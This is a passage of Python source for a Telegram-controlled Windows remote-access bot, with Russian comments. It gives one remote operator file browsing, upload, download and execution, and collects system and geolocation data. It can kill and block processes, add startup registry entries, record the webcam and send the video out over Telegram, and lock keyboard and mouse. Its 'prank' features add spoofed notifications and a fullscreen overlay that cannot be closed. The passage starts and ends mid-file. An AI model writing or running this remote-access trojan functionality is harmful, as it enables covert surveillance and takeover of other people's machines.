        bot.answer_callback_query(call.id, "Отправьте файл для загрузки")
        bot.send_message(call.message.chat.id, f"Отправьте файл для загрузки в '{path}'")
        bot.register_next_step_handler_by_chat_id(call.message.chat.id, lambda msg: process_upload_to_folder(msg, path))
    except Exception as e:
        handle_error(e, "подготовке загрузки файла в папку")

def process_upload_to_folder(message, folder_path):
    try:
        if not check_id(message):
            return
        if message.document:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            save_path = os.path.join(folder_path, message.document.file_name)
            with open(save_path, "wb") as f:
                f.write(downloaded_file)
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton("Да", callback_data=f"upload_confirm:yes:{folder_path}"),
                types.InlineKeyboardButton("Нет", callback_data="upload_confirm:no")
            )
            bot.send_message(message.chat.id, f"📥 Файл сохранён в {save_path}\nПродолжить загрузку файлов в эту папку?", reply_markup=markup)
        else:
            bot.send_message(message.chat.id, "Пожалуйста, отправьте файл (документ)")
    except Exception as e:
        handle_error(e, "загрузке файла в папку")

@bot.callback_query_handler(func=lambda call: call.data.startswith("file:"))
def file_callback(call):
    try:
        file_path = call.data.split(":", 1)[1]
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Скачать", callback_data=f"download:{file_path}"))
        markup.add(types.InlineKeyboardButton("Удалить", callback_data=f"delete_file:{file_path}"))
        markup.add(types.InlineKeyboardButton("Запустить/Открыть", callback_data=f"run_file:{file_path}"))
        markup.add(types.InlineKeyboardButton("Назад", callback_data=f"folder:0:{os.path.dirname(file_path)}"))
        bot.edit_message_text(f"Действия с файлом {os.path.basename(file_path)}:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    except Exception as e:
        handle_error(e, "работе с файлом")

@bot.callback_query_handler(func=lambda call: call.data.startswith("download:"))
def download_file(call):
    try:
        file_path = call.data.split(":", 1)[1]
        with open(file_path, 'rb') as f:
            bot.send_document(call.message.chat.id, f)
        bot.answer_callback_query(call.id, "Файл отправлен")
    except Exception as e:
        handle_error(e, "скачивании файла")

@bot.callback_query_handler(func=lambda call: call.data.startswith("delete_file:"))
def delete_file(call):
    try:
        file_path = call.data.split(":", 1)[1]
        os.remove(file_path)
        bot.answer_callback_query(call.id, "Файл удалён")
        folder_callback(types.CallbackQuery(id=call.id, from_user=call.from_user, message=call.message, data=f"folder:0:{os.path.dirname(file_path)}"))
    except Exception as e:
        handle_error(e, "удалении файла")

@bot.callback_query_handler(func=lambda call: call.data.startswith("run_file:"))
def run_file(call):
    try:
        file_path = call.data.split(":", 1)[1]
        os.startfile(file_path)
        bot.answer_callback_query(call.id, "Файл запущен")
    except Exception as e:
        handle_error(e, "запуске файла")

@bot.callback_query_handler(func=lambda call: call.data == "drives")
def show_drives(call):
    try:
        markup = types.InlineKeyboardMarkup()
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        for drive in drives:
            markup.add(types.InlineKeyboardButton(drive, callback_data=f"folder:0:{drive}"))
        markup.add(types.InlineKeyboardButton("⬅️ Назад", callback_data="back:main"))
        bot.edit_message_text("Выберите диск:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    except Exception as e:
        handle_error(e, "возврате к дискам")

@bot.callback_query_handler(func=lambda call: call.data.startswith("upload_confirm:"))
def upload_confirm_callback(call):
    try:
        if not check_id(call.message):
            return
        action = call.data.split(":")[1]
        if action == "yes":
            folder_path = call.data.split(":", 2)[2]
            if not os.path.isdir(folder_path):
                bot.answer_callback_query(call.id, "Ошибка: папка больше не существует")
                bot.edit_message_text("Папка больше не существует.", call.message.chat.id, call.message.message_id, reply_markup=None)
                return
            bot.edit_message_text(f"📁 Папка {os.path.basename(folder_path) or folder_path}:", call.message.chat.id, call.message.message_id, reply_markup=None)
            bot.send_message(call.message.chat.id, f"Отправьте следующий файл для загрузки в '{folder_path}'")
            bot.register_next_step_handler_by_chat_id(call.message.chat.id, lambda msg: process_upload_to_folder(msg, folder_path))
        else:
            bot.edit_message_text("Загрузка завершена.", call.message.chat.id, call.message.message_id, reply_markup=None)
        bot.answer_callback_query(call.id)
    except Exception as e:
        handle_error(e, "подтверждении загрузки файла")

# Система

@bot.message_handler(func=lambda message: message.text == "🖥 Система")
def sysinfo_command(message):
    global sysinfo_running
    try:
        if not check_id(message):
            return
        if sysinfo_running:
            bot.send_message(message.chat.id, "Информация о системе уже собирается, пожалуйста, подождите.")
            return

        sysinfo_running = True
        bot.send_message(message.chat.id, "Сбор информации о системе начат...")

        def collect_system_info():
            try:
                # Операционная система
                os_name = platform.system()
                os_version = platform.version()
                os_architecture = platform.architecture()[0]
                boot_time = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")

                # Процессор
                cpu_name = platform.processor()
                cpu_cores = psutil.cpu_count(logical=False)
                cpu_threads = psutil.cpu_count(logical=True)
                cpu_freq = psutil.cpu_freq().current if psutil.cpu_freq() else "Не удалось определить"

                # Температура CPU (используем wmi, так как psutil не предоставляет эти данные)
                cpu_temp = "Не удалось определить"
                try:
                    pythoncom.CoInitializeEx(pythoncom.COINIT_MULTITHREADED)
                    wmi_obj = wmi.WMI()
                    temp_info = wmi_obj.MSAcpi_ThermalZoneTemperature()
                    cpu_temp = temp_info[0].CurrentTemperature / 10 - 273.15 if temp_info else "Не удалось определить"
                except Exception as wmi_error:
                    handle_error(wmi_error, "получении температуры CPU")
                finally:
                    try:
                        pythoncom.CoUninitialize()
                    except pythoncom.com_error:
                        pass

                # Оперативная память
                ram = psutil.virtual_memory()
                ram_total = round(ram.total / (1024**3), 2)
                ram_used = round(ram.used / (1024**3), 2)

                # Диски
                disk_info = psutil.disk_partitions()
                disks = []
                for partition in disk_info:
                    try:
                        usage = psutil.disk_usage(partition.mountpoint)
                        disks.append(
                            f"{partition.device} - {round(usage.total / (1024**3), 2)} GB "
                            f"(свободно: {round(usage.free / (1024**3), 2)} GB)"
                        )
                    except:
                        continue

                # Видеокарта (используем wmi)
                gpu_name = "Не удалось определить"
                gpu_resolution = "Не удалось определить"
                try:
                    pythoncom.CoInitializeEx(pythoncom.COINIT_MULTITHREADED)
                    wmi_obj = wmi.WMI()
                    gpu_info = wmi_obj.Win32_VideoController()[0]
                    gpu_name = gpu_info.Name
                    gpu_resolution = f"{gpu_info.CurrentHorizontalResolution}x{gpu_info.CurrentVerticalResolution}"
                except Exception as wmi_error:
                    handle_error(wmi_error, "получении данных о видеокарте")
                finally:
                    try:
                        pythoncom.CoUninitialize()
                    except pythoncom.com_error:
                        pass

                # Материнская плата (используем wmi)
                motherboard_info = "Не удалось определить"
                try:
                    pythoncom.CoInitializeEx(pythoncom.COINIT_MULTITHREADED)
                    wmi_obj = wmi.WMI()
                    mb_info = wmi_obj.Win32_BaseBoard()[0]
                    motherboard_info = f"{mb_info.Manufacturer} {mb_info.Product}"
                except Exception as wmi_error:
                    handle_error(wmi_error, "получении данных о материнской плате")
                finally:
                    try:
                        pythoncom.CoUninitialize()
                    except pythoncom.com_error:
                        pass

                # Сетевые адаптеры
                network_info = psutil.net_if_addrs()
                network_stats = psutil.net_if_stats()
                network_details = []
                for iface, addrs in network_info.items():
                    if iface in network_stats and network_stats[iface].isup:
                        for addr in addrs:
                            if addr.family == 2:  # IPv4
                                network_details.append(f"Адаптер: {iface}\nIP: {addr.address}\n")

                # USB-устройства (используем wmi)
                usb_devices = []
                try:
                    pythoncom.CoInitializeEx(pythoncom.COINIT_MULTITHREADED)
                    wmi_obj = wmi.WMI()
                    usb_devices_raw = wmi_obj.Win32_PnPEntity()
                    usb_devices = [device.Caption for device in usb_devices_raw if device.Caption and 'USB' in device.Caption]
                except Exception as wmi_error:
                    handle_error(wmi_error, "получении данных об USB-устройствах")
                finally:
                    try:
                        pythoncom.CoUninitialize()
                    except pythoncom.com_error:
                        pass

                # IP-адрес и провайдер
                ip_info = requests.get("http://ipinfo.io/json").json()
                ip = ip_info.get("ip", "Не удалось определить")
                provider = ip_info.get("org", "Не удалось определить")
                city = ip_info.get("city", "Не удалось определить")
                region = ip_info.get("region", "Не удалось определить")

                # Формируем информацию
                info = (
                    f"🖥 **Система**:\n"
                    f"OS: {os_name} {os_version} ({os_architecture})\n"
                    f"Последняя загрузка: {boot_time}\n\n"
                    f"💻 **Аппаратное обеспечение**:\n"
                    f"CPU: {cpu_name}\n"
                    f"Частота: {cpu_freq} MHz\n"
                    f"Ядер: {cpu_cores}\n"
                    f"Потоков: {cpu_threads}\n"
                    f"Температура CPU: {cpu_temp} °C\n"
                    f"RAM: {ram_total} GB (использовано: {ram_used} GB)\n"
                    f"Видеокарта: {gpu_name}\n"
                    f"Разрешение: {gpu_resolution}\n"
                    f"Материнская плата: {motherboard_info}\n\n"
                    f"💾 **Диски**:\n"
                )
                for disk in disks:
                    info += f"{disk}\n"

                info += "\n🔌 **Подключённые USB-устройства**:\n"
                if usb_devices:
                    for device in usb_devices:
                        info += f"- {device}\n"
                else:
                    info += "Нет подключённых USB-устройств.\n"

                info += "\n🌐 **Сеть**:\n"
                info += f"IP: {ip}\n"
                info += f"Провайдер: {provider}\n"
                info += f"Город: {city}\n"
                info += f"Регион: {region}\n"
                for net in network_details:
                    info += net

                bot.send_message(message.chat.id, info)
            except Exception as e:
                handle_error(e, "сборе информации о системе")
            finally:
                global sysinfo_running
                sysinfo_running = False

        # Запуск сбора информации в отдельном потоке
        threading.Thread(target=collect_system_info, daemon=True).start()
    except Exception as e:
        handle_error(e, "запуске сбора информации о системе")
        sysinfo_running = False

# Процессы
@bot.message_handler(func=lambda message: message.text == "📺 Процессы")
def processes_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("👤 Запущенные программы", callback_data="proc_type:user:0"))
        markup.add(types.InlineKeyboardButton("🕒 Фоновые процессы", callback_data="proc_type:background:0"))
        markup.add(types.InlineKeyboardButton("🪟 Процессы Windows", callback_data="proc_type:windows:0"))
        markup.add(types.InlineKeyboardButton("🚫 Заблокированные", callback_data="proc_type:blocked:0"))
        markup.add(types.InlineKeyboardButton("⬅️ Назад", callback_data="back:main"))
        bot.send_message(message.chat.id, "Выберите тип процессов:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "меню процессов")

def show_processes(call, proc_type, page=0, per_page=10):
    try:
        markup = types.InlineKeyboardMarkup()
        processes = sorted(psutil.process_iter(['pid', 'name', 'create_time', 'username']), key=lambda p: p.info['create_time'], reverse=True)
        filtered = {
            "user": [p for p in processes if p.info['username'] and "SYSTEM" not in p.info['username'] and "SERVICE" not in p.info['username']],
            "background": [p for p in processes if p.info['username'] and ("SYSTEM" in p.info['username'] or "SERVICE" in p.info['username'])],
            "windows": [p for p in processes if p.info['name'].lower().startswith("svchost") or "win" in p.info['name'].lower()],
            "blocked": [p for p in processes if p.info['name'].lower() in blocked_apps]
        }.get(proc_type, [])
        
        total_pages = (len(filtered) + per_page - 1) // per_page
        start = page * per_page
        end = min(start + per_page, len(filtered))
        
        for proc in filtered[start:end]:
            markup.add(types.InlineKeyboardButton(proc.info['name'], callback_data=f"proc:{proc.info['pid']}"))
        
        nav_row = []
        if page > 0:
            nav_row.append(types.InlineKeyboardButton("⬅️", callback_data=f"proc_type:{proc_type}:{page-1}"))
        if page < total_pages - 1:
            nav_row.append(types.InlineKeyboardButton("➡️", callback_data=f"proc_type:{proc_type}:{page+1}"))
        if nav_row:
            markup.row(*nav_row)
        
        markup.add(types.InlineKeyboardButton("Назад в меню", callback_data="back:processes"))
        bot.edit_message_text(f"Процессы ({proc_type}) [{page+1}/{total_pages}]:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    except Exception as e:
        handle_error(e, "отображении процессов")

@bot.callback_query_handler(func=lambda call: call.data.startswith("proc_type:"))
def proc_type_callback(call):
    try:
        proc_type, page = call.data.split(":", 2)[1:]
        show_processes(call, proc_type, int(page))
    except Exception as e:
        handle_error(e, "выборе типа процессов")

@bot.callback_query_handler(func=lambda call: call.data.startswith("proc:"))
def proc_callback(call):
    try:
        pid = int(call.data.split(":", 1)[1])
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Приостановить", callback_data=f"suspend:{pid}"))
        markup.add(types.InlineKeyboardButton("Остановить", callback_data=f"kill:{pid}"))
        markup.add(types.InlineKeyboardButton("Удалить", callback_data=f"delete:{pid}"))
        markup.add(types.InlineKeyboardButton("Заблокировать", callback_data=f"block:{pid}"))
        p = psutil.Process(pid)
        if p.name().lower() in blocked_apps:
            markup.add(types.InlineKeyboardButton("Разблокировать", callback_data=f"unblock:{pid}"))
        markup.add(types.InlineKeyboardButton("Назад", callback_data="back:processes"))
        bot.edit_message_text(f"Процесс {p.name()} (PID {pid}):", call.message.chat.id, call.message.message_id, reply_markup=markup)
    except Exception as e:
        handle_error(e, "работе с процессом")

@bot.callback_query_handler(func=lambda call: call.data.startswith("suspend:"))
def suspend_callback(call):
    try:
        pid = int(call.data.split(":", 1)[1])
        p = psutil.Process(pid)
        p.suspend()
        bot.answer_callback_query(call.id, "Процесс приостановлен")
    except Exception as e:
        handle_error(e, "приостановке процесса")

@bot.callback_query_handler(func=lambda call: call.data.startswith("kill:"))
def kill_callback(call):
    try:
        pid = int(call.data.split(":", 1)[1])
        p = psutil.Process(pid)
        p.kill()
        bot.answer_callback_query(call.id, "Процесс остановлен")
    except Exception as e:
        handle_error(e, "остановке процесса")

@bot.callback_query_handler(func=lambda call: call.data.startswith("delete:"))
def delete_callback(call):
    try:
        pid = int(call.data.split(":", 1)[1])
        p = psutil.Process(pid)
        p.terminate()
        bot.answer_callback_query(call.id, "Процесс удалён")
    except Exception as e:
        handle_error(e, "удалении процесса")

@bot.callback_query_handler(func=lambda call: call.data.startswith("block:"))
def block_callback(call):
    try:
        pid = int(call.data.split(":", 1)[1])
        p = psutil.Process(pid)
        blocked_apps.add(p.name().lower())
        bot.answer_callback_query(call.id, f"{p.name()} заблокирован")
    except Exception as e:
        handle_error(e, "блокировке процесса")

@bot.callback_query_handler(func=lambda call: call.data.startswith("unblock:"))
def unblock_callback(call):
    try:
        pid = int(call.data.split(":", 1)[1])
        p = psutil.Process(pid)
        blocked_apps.discard(p.name().lower())
        bot.answer_callback_query(call.id, f"{p.name()} разблокирован")
    except Exception as e:
        handle_error(e, "разблокировке процесса")

def check_blocked_apps():
    try:
        while True:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in blocked_apps:
                    proc.kill()
            time.sleep(1)
    except Exception as e:
        handle_error(e, "проверке заблокированных приложений")

threading.Thread(target=check_blocked_apps, daemon=True).start()

# Автозагрузка
@bot.message_handler(func=lambda message: message.text == "🔧 Автозагрузка")
def startup_command(message):
    try:
        if not check_id(message):
            return
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("📋 Просмотр", "➕ Добавить", "➖ Удалить", "⬅️ Назад")
        bot.send_message(message.chat.id, "Управление автозагрузкой:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "меню автозагрузки")

@bot.message_handler(func=lambda message: message.text == "📋 Просмотр")
def startup_list(message):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
        items = []
        i = 0
        while True:
            try:
                name, value, _ = winreg.EnumValue(key, i)
                items.append(f"🔹 {name} → {value}")
                i += 1
            except:
                break
        winreg.CloseKey(key)
        bot.send_message(message.chat.id, "Программы в автозагрузке:\n" + "\n".join(items) or "Список пуст")
    except Exception as e:
        handle_error(e, "просмотре автозагрузки")

@bot.message_handler(func=lambda message: message.text == "➕ Добавить")
def startup_add(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "Отправь имя и путь (пример: MyApp C:\\app.exe)")
        bot.register_next_step_handler(message, add_to_startup)
    except Exception as e:
        handle_error(e, "добавлении в автозагрузку")

def add_to_startup(message):
    try:
        name, path = message.text.split(" ", 1)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
        bot.send_message(message.chat.id, f"✅ {name} добавлен")
    except Exception as e:
        handle_error(e, "добавлении программы в автозагрузку")

@bot.message_handler(func=lambda message: message.text == "➖ Удалить")
def startup_remove(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "Отправь имя программы")
        bot.register_next_step_handler(message, remove_from_startup)
    except Exception as e:
        handle_error(e, "удалении из автозагрузки")

def remove_from_startup(message):
    try:
        name = message.text
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
        bot.send_message(message.chat.id, f"❌ {name} удалён")
    except Exception as e:
        handle_error(e, "удалении программы из автозагрузки")

# Уведомления
def show_fullscreen_notification(text):
    try:
        create_overlay()
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.overrideredirect(True)
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        root.configure(bg='black')
        label = tk.Label(root, text=text, font=("Arial", 20), fg="white", bg="black", wraplength=600)
        label.pack(expand=True, pady=100)
        yes_button = tk.Button(root, text="Да", command=lambda: [bot.send_message(my_id, "Пользователь выбрал: Да"), root.destroy(), destroy_overlay()], font=("Arial", 20), width=10, height=2)
        no_button = tk.Button(root, text="Нет", command=lambda: [bot.send_message(my_id, "Пользователь выбрал: Нет"), root.destroy(), destroy_overlay()], font=("Arial", 20), width=10, height=2)
        yes_button.place(relx=0.35, rely=0.7, anchor="center")
        no_button.place(relx=0.65, rely=0.7, anchor="center")
        root.mainloop()
    except Exception as e:
        handle_error(e, "отображении уведомления")
        destroy_overlay()

@bot.message_handler(func=lambda message: message.text == "📩 Уведомления")
def notify_command(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "Отправь текст уведомления")
        bot.register_next_step_handler(message, send_fullscreen_notification)
    except Exception as e:
        handle_error(e, "меню уведомлений")

def send_fullscreen_notification(message):
    try:
        threading.Thread(target=show_fullscreen_notification, args=(message.text,), daemon=True).start()
    except Exception as e:
        handle_error(e, "отправке уведомления")

# Громкость
@bot.message_handler(func=lambda message: message.text == "🔊 Громкость")
def volume_command(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Громче", callback_data="vol:up"))
        markup.add(types.InlineKeyboardButton("Тише", callback_data="vol:down"))
        markup.add(types.InlineKeyboardButton("Выключить", callback_data="vol:mute"))
        markup.add(types.InlineKeyboardButton("Ввести уровень", callback_data="vol:set"))
        markup.add(types.InlineKeyboardButton("Назад", callback_data="back:main"))
        bot.send_message(message.chat.id, "Управление громкостью:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "меню громкости")

@bot.callback_query_handler(func=lambda call: call.data.startswith("vol:"))
def vol_callback(call):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = interface.QueryInterface(IAudioEndpointVolume)
        current = volume.GetMasterVolumeLevelScalar()
        if call.data == "vol:up":
            volume.SetMasterVolumeLevelScalar(min(current + 0.1, 1.0), None)
            bot.answer_callback_query(call.id, "Громкость увеличена")
        elif call.data == "vol:down":
            volume.SetMasterVolumeLevelScalar(max(current - 0.1, 0.0), None)
            bot.answer_callback_query(call.id, "Громкость уменьшена")
        elif call.data == "vol:mute":
            volume.SetMute(1, None)
            bot.answer_callback_query(call.id, "Звук выключен")
        elif call.data == "vol:set":
            bot.send_message(call.message.chat.id, "Введи уровень громкости (0-100):")
            bot.register_next_step_handler(call.message, set_volume)
    except Exception as e:
        handle_error(e, "управлении громкостью")

def set_volume(message):
    try:
        level = int(message.text)
        if 0 <= level <= 100:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = interface.QueryInterface(IAudioEndpointVolume)
            volume.SetMasterVolumeLevelScalar(level / 100, None)
            bot.send_message(message.chat.id, f"Громкость установлена на {level}%")
        else:
            bot.send_message(message.chat.id, "Введите число от 0 до 100")
    except Exception as e:
        handle_error(e, "установке уровня громкости")

# Стриминг
def stream_with_audio(chat_id, duration=10):
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            bot.send_message(chat_id, "Не удалось открыть веб-камеру")
            return

        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        temp_video = "temp_stream.avi"
        out = cv2.VideoWriter(temp_video, fourcc, 20.0, (640, 480))
        
        start_time = time.time()
        while time.time() - start_time < duration:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
        
        cap.release()
        out.release()
        cv2.destroyAllWindows()

        if not os.path.exists(temp_video) or os.path.getsize(temp_video) == 0:
            bot.send_message(chat_id, "Ошибка: не удалось записать видео")
            return

        with open(temp_video, "rb") as video:
            bot.send_video(chat_id, video, supports_streaming=True)
        
        os.remove(temp_video)
    except Exception as e:
        handle_error(e, "стриминге")

@bot.message_handler(func=lambda message: message.text == "📡 Стриминг")
def stream_command(message):
    try:
        if not check_id(message):
            return
        global streaming
        streaming = True
        threading.Thread(target=stream_with_audio, args=(message.chat.id,), daemon=True).start()
        bot.send_message(message.chat.id, "Стриминг начат (10 секунд).")
    except Exception as e:
        handle_error(e, "запуске стриминга")

# Веселье
@bot.message_handler(func=lambda message: message.text == "🎉 Веселье")
def fun_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("🔊 Включить звук по ссылке", "🖥 Монитор", "🖱 Инверсия мыши")
        markup.add("😂 Шутки", "🖼 Смена обоев", "📸 Открыть фото")
        markup.add("📢 Системное уведомление", "🔒 Блокировка ввода")
        markup.add("⛔ Остановить шутки", "⬅️ Назад")
        bot.send_message(message.chat.id, "Веселье:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "меню веселья")

@bot.message_handler(func=lambda message: message.text == "🔒 Блокировка ввода")
def toggle_input_block(message):
    try:
        if not check_id(message):
            return
        global input_blocked
        if input_blocked:
            input_blocked = False
            bot.send_message(message.chat.id, "Блокировка клавиатуры и мыши отключена.")
        else:
            if not is_admin():
                bot.send_message(message.chat.id, "Требуются права администратора для блокировки ввода.")
                return
            input_blocked = True
            pyautogui.FAILSAFE = False  # Отключаем failsafe для блокировки
            bot.send_message(message.chat.id, "Клавиатура и мышь заблокированы. Нажмите '🔒 Блокировка ввода' снова, чтобы отключить.")
            threading.Thread(target=block_input, daemon=True).start()
    except Exception as e:
        handle_error(e, "управлении блокировкой ввода")

def block_input():
    try:
        global input_blocked
        screen_width, screen_height = pyautogui.size()
        while input_blocked:
            # Перемещаем мышь в угол
            pyautogui.moveTo(screen_width - 1, screen_height - 1)
            # Блокируем клавиатуру, поглощая ввод
            for key in ['ctrl', 'alt', 'shift', 'win', 'esc']:  # Блокируем системные клавиши
                pyautogui.keyDown(key)
                pyautogui.keyUp(key)
            time.sleep(0.5)
    except Exception as e:
        handle_error(e, "блокировке ввода")
    finally:
        pyautogui.FAILSAFE = True  # Восстанавливаем failsafe

@bot.message_handler(func=lambda message: message.text == "📢 Системное уведомление")
def send_system_notification(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "Введите отправителя уведомления (например, Telegram Bot):")
        bot.register_next_step_handler(message, lambda msg: process_notification_sender(msg))
    except Exception as e:
        handle_error(e, "подготовке системного уведомления")

def process_notification_sender(message):
    try:
        if not check_id(message):
            return
        sender = message.text
        bot.send_message(message.chat.id, "Введите текст уведомления:")
        bot.register_next_step_handler(message, lambda msg: process_notification_text(msg, sender))
    except Exception as e:
        handle_error(e, "обработке отправителя уведомления")

def process_notification_text(message, sender):
    try:
        if not check_id(message):
            return
        text = message.text
        toaster = ToastNotifier()
        toaster.show_toast(sender, text, duration=10, threaded=True)
        bot.send_message(message.chat.id, "Системное уведомление отправлено!")
    except Exception as e:
        handle_error(e, "отправке системного уведомления")

@bot.message_handler(func=lambda message: message.text == "🔊 Включить звук по ссылке")
def play_url_sound(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "Отправь прямую ссылку на аудиофайл (MP3/WAV)")
        bot.register_next_step_handler(message, play_url_audio)
    except Exception as e:
        handle_error(e, "меню звука по ссылке")

def play_url_audio(message):
    global sound_playing
    try:
        url = message.text
        # Проверяем, является ли ссылка действительной
        if not url.startswith("http"):
            bot.send_message(message.chat.id, "Ошибка: Пожалуйста, отправьте действительную ссылку (начинается с http или https).")
            return

        # Скачиваем файл
        response = requests.get(url, stream=True)
        if response.status_code != 200:
            bot.send_message(message.chat.id, "Ошибка: Не удалось скачать файл. Проверьте ссылку.")
            return

        # Определяем расширение файла из URL
        file_extension = url.lower().split(".")[-1]
        if file_extension not in ["mp3", "wav"]:
            bot.send_message(message.chat.id, "Ошибка: Поддерживаются только MP3 и WAV файлы.")
            return

        temp_file = f"temp_audio.{file_extension}"
        with open(temp_file, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)

        # Воспроизведение в зависимости от формата
        if file_extension == "wav":
            # Для WAV используем winsound
            sound_playing = True
            winsound.PlaySound(temp_file, winsound.SND_FILENAME | winsound.SND_ASYNC)
            bot.send_message(message.chat.id, "Воспроизведение WAV начато. Остановить можно через '⛔ Остановить шутки'.")
            while sound_playing and prank_active:  # Используем prank_active для остановки
                time.sleep(1)
            winsound.PlaySound(None, 0)  # Останавливаем звук
            os.remove(temp_file)
        else:
            # Для MP3 используем os.startfile (откроется в стандартном проигрывателе)
            bot.send_message(message.chat.id, "Воспроизведение MP3 начато в стандартном проигрывателе. Остановить можно вручную.")
            os.startfile(temp_file)  # Открываем MP3 в стандартном проигрывателе
            # Поскольку мы не можем управлять воспроизведением, оставляем файл до ручного закрытия
            # Файл удалится при следующем вызове функции или при перезапуске бота
    except Exception as e:
        handle_error(e, "воспроизведении звука по ссылке")
        if os.path.exists("temp_audio.mp3"):
            os.remove("temp_audio.mp3")
        if os.path.exists("temp_audio.wav"):
            os.remove("temp_audio.wav")

@bot.message_handler(func=lambda message: message.text == "🖥 Монитор")
def monitor_control(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Включить", callback_data="monitor:on"))
        markup.add(types.InlineKeyboardButton("Выключить", callback_data="monitor:off"))
        markup.add(types.InlineKeyboardButton("Назад", callback_data="back:fun"))
        bot.send_message(message.chat.id, "Управление монитором:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "меню управления монитором")

@bot.callback_query_handler(func=lambda call: call.data.startswith("monitor:"))
def monitor_callback(call):
    try:
        action = call.data.split(":", 1)[1]
        if action == "off":
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
            bot.answer_callback_query(call.id, "Монитор выключен")
        elif action == "on":
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
            bot.answer_callback_query(call.id, "Монитор включён")
    except Exception as e:
        handle_error(e, "управлении монитором")

@bot.message_handler(func=lambda message: message.text == "🖱 Инверсия мыши")
def invert_mouse(message):
    try:
        if not check_id(message):
            return
        current = ctypes.windll.user32.GetSystemMetrics(23)
        ctypes.windll.user32.SwapMouseButton(1 if current == 0 else 0)
        bot.send_message(message.chat.id, "Кнопки мыши инвертированы")
    except Exception as e:
        handle_error(e, "инверсии мыши")

@bot.message_handler(func=lambda message: message.text == "🖼 Смена обоев")
def change_wallpaper_menu(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "Отправь изображение для установки обоев")
        bot.register_next_step_handler(message, change_wallpaper)
    except Exception as e:
        handle_error(e, "меню смены обоев")

def change_wallpaper(message):
    try:
        if not message.photo:
            bot.send_message(message.chat.id, "Отправь изображение")
            return
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open("wallpaper.jpg", "wb") as f:
            f.write(downloaded_file)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("wallpaper.jpg"), 3)
        bot.send_message(message.chat.id, "Обои изменены")
    except Exception as e:
        handle_error(e, "смене обоев")

@bot.message_handler(func=lambda message: message.text == "📸 Открыть фото")
def open_photo_menu(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "Отправь фото для открытия на весь экран")
        bot.register_next_step_handler(message, open_photo)
    except Exception as e:
        handle_error(e, "меню открытия фото")

def open_photo(message):
    try:
        if not message.photo:
            bot.send_message(message.chat.id, "Отправь фото")
            return
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        image_path = "fullscreen_image.jpg"
        with open(image_path, "wb") as f:
            f.write(downloaded_file)
        threading.Thread(target=show_fullscreen_image, args=(image_path, message.chat.id), daemon=True).start()
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Закрыть фото", callback_data="close_photo"))
        bot.send_message(message.chat.id, "Фото открыто. Нажми кнопку, чтобы закрыть:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "открытии фото")

def show_fullscreen_image(image_path, chat_id):
    try:
        if not os.path.exists(image_path):
            bot.send_message(chat_id, "Ошибка: файл изображения не найден")
            return
        
        process = subprocess.Popen([sys.executable, "-c", f"""
import tkinter as tk
from PIL import Image, ImageTk
root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
